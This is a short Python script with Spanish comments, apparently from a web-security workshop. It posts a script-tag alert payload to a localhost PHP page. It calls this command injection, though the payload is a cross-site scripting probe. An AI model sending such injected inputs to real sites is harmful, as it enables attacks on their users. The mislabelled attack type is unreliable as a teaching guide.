# Ejemplo de injeccion de comandos
import requests

# Comando/orden a ejecutar
comando = "<script> alert('Hola'); </script>"

# Peticion POST
req = requests.post('http://localhost:8888/taller_web/commandinjection.php', data = {"texto":comando})

# Salida del resultado
print(req.text)